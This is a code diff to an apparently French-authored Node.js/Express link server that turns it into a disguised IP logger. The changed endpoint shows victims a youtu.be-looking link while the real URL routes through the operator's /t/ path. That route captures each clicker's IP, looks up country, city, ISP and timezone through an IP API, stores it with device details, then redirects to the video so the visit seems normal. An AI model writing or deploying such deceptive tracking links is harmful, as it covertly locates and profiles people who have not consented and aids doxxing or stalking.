@@ -37,22 +37,22 @@ app.get('/api/shorten', (req, res) => {
             return res.status(400).json({ error: 'Invalid video ID' });
         }
 
-        // Au lieu de générer un nouvel ID, on utilise l'ID original
-        const shortUrl = `https://youtu.be/watch?v=${videoId}`;
-        
-        // On stocke quand même dans le mapping pour le tracking
-        urlMappings.set(videoId, videoId);
+        // Créer un ID court pour le tracking tout en gardant l'apparence YouTube
+        const trackingId = generateYouTubeId();
+        urlMappings.set(trackingId, videoId);
         
         if (urlMappings.size > 1000) {
             const firstKey = urlMappings.keys().next().value;
             urlMappings.delete(firstKey);
         }
 
-        console.log('\x1b[32m%s\x1b[0m', `Generated short URL: ${shortUrl} for video: ${videoId}`);
+        // Le lien ressemble à YouTube mais passe par notre serveur pour le tracking
+        const shortUrl = `${SERVER_URL}/t/${trackingId}`;
+        console.log('\x1b[32m%s\x1b[0m', `Generated tracking URL: ${shortUrl} for video: ${videoId}`);
         
         res.json({ 
-            shortUrl: shortUrl,
-            fullUrl: `${SERVER_URL}/v/${videoId}`
+            shortUrl: `https://youtu.be/watch?v=${videoId}`, // Pour l'affichage
+            trackingUrl: shortUrl // URL réelle pour le tracking
         });
     } catch (error) {
         console.error('\x1b[31m%s\x1b[0m', `Error generating short URL: ${error}`);
@@ -60,15 +60,15 @@ app.get('/api/shorten', (req, res) => {
     }
 });
 
-// Route pour rediriger les liens courts
-app.get('/v/:id', async (req, res) => {
+// Nouvelle route pour le tracking qui redirige ensuite vers youtu.be
+app.get('/t/:id', async (req, res) => {
     const videoId = urlMappings.get(req.params.id);
     if (!videoId) {
         return res.redirect('https://youtube.com');
     }
     
     try {
-        // Traitement de l'IP et autres données...
+        // Get real IP and clean it
         let ip = req.realIp.replace('::ffff:', '');
         ip = ip.split(',')[0].trim();
         
@@ -85,12 +85,9 @@ app.get('/v/:id', async (req, res) => {
             isBot: agent.isBot
         };
 
-        console.log('\x1b[36m%s\x1b[0m', `Device info: ${JSON.stringify(deviceInfo)}`);
-
         // Pour les tests locaux
         if (ip === '::1' || ip === '127.0.0.1') {
             ip = '8.8.8.8';
-            console.log('\x1b[33m%s\x1b[0m', `Local IP detected, using test IP: ${ip}`);
         }
 
         try {
@@ -99,7 +96,6 @@ app.get('/v/:id', async (req, res) => {
             if (ipInfo.data.status === 'success') {
                 console.log('\x1b[32m%s\x1b[0m', `Location found: ${ipInfo.data.city}, ${ipInfo.data.country}`);
                 
-                // Store in memory with device info
                 trackedIPs.push({
                     ip: ip,
                     country: ipInfo.data.country,
@@ -111,23 +107,20 @@ app.get('/v/:id', async (req, res) => {
                     isp: ipInfo.data.isp,
                     org: ipInfo.data.org,
                     as: ipInfo.data.as,
-                    timezone: ipInfo.data.timezone
+                    timezone: ipInfo.data.timezone,
+                    videoId: videoId // Ajout de l'ID de la vidéo pour le suivi
                 });
-
-                console.log('\x1b[32m%s\x1b[0m', `IP data stored successfully. Total IPs: ${trackedIPs.length}`);
 
                 if (trackedIPs.length > 100) {
                     trackedIPs = trackedIPs.slice(-100);
                 }
-            } else {
-                console.error('\x1b[31m%s\x1b[0m', `IP API returned error status: ${ipInfo.data.message}`);
             }
         } catch (apiError) {
             console.error('\x1b[31m%s\x1b[0m', `Error calling IP API: ${apiError.message}`);
         }
 
-        // Rediriger vers la vraie vidéo YouTube
-        res.redirect(`https://youtube.com/watch?v=${videoId}`);
+        // Redirection vers le format youtu.be
+        res.redirect(`https://youtu.be/watch?v=${videoId}`);
     } catch (error) {
         console.error('\x1b[31m%s\x1b[0m', `Error processing request: ${error}`);
         res.redirect('https://youtube.com');
